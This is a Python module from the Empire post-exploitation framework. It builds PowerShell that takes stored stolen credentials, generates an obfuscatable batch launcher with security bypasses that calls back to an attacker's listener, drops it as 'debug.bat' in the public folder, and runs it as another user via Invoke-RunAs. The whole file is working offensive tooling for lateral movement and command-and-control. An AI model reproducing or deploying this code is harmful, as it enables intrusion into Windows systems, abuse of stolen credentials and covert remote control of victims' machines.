from __future__ import print_function

import pathlib
from builtins import object, str
from typing import Dict

from empire.server.common import helpers
from empire.server.common.module_models import PydanticModule
from empire.server.database.models import Credential
from empire.server.utils import data_util
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(
        main_menu,
        module: PydanticModule,
        params: Dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):

        # read in the common module source code
        script, err = main_menu.modules.get_module_source(
            module_name=module.script_path,
            obfuscate=obfuscate,
            obfuscate_command=obfuscation_command,
        )

        if err:
            return handle_error_message(err)

        # if a credential ID is specified, try to parse
        cred_id = params["CredID"]
        if cred_id != "":

            if not main_menu.credentials.is_credential_valid(cred_id):
                return handle_error_message("[!] CredID is invalid!")

            cred: Credential = main_menu.credentials.get_credentials(cred_id)

            if cred.domain != "":
                params["Domain"] = cred.domain
            if cred.username != "":
                params["UserName"] = cred.username
            if cred.password != "":
                params["Password"] = cred.password

        # extract all of our options

        launcher = main_menu.stagers.stagers["windows/launcher_bat"]
        launcher.options["Listener"]["Value"] = params["Listener"]
        launcher.options["Delete"]["Value"] = "True"
        if (params["Obfuscate"]).lower() == "true":
            launcher.options["Obfuscate"]["Value"] = "True"
            launcher.options["ObfuscateCommand"]["Value"] = params["ObfuscateCommand"]
        else:
            launcher.options["Obfuscate"]["Value"] = "False"
        launcher.options["Bypasses"]["Value"] = params["Bypasses"]
        launcher_code = launcher.generate()

        # PowerShell code to write the launcher.bat out
        script_end = '$tempLoc = "$env:public\debug.bat"'
        script_end += '\n$batCode = @"\n' + launcher_code + '"@\n'
        script_end += "$batCode | Out-File -Encoding ASCII $tempLoc ;\n"
        script_end += '"Launcher bat written to $tempLoc `n";\n'

        script_end += "\nInvoke-RunAs "
        script_end += "-UserName %s " % (params["UserName"])
        script_end += "-Password '%s' " % (params["Password"])

        domain = params["Domain"]
        if domain and domain != "":
            script_end += "-Domain %s " % (domain)

        script_end += '-Cmd "$env:public\debug.bat"'

        script = main_menu.modules.finalize_module(
            script=script,
            script_end=script_end,
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
        return script
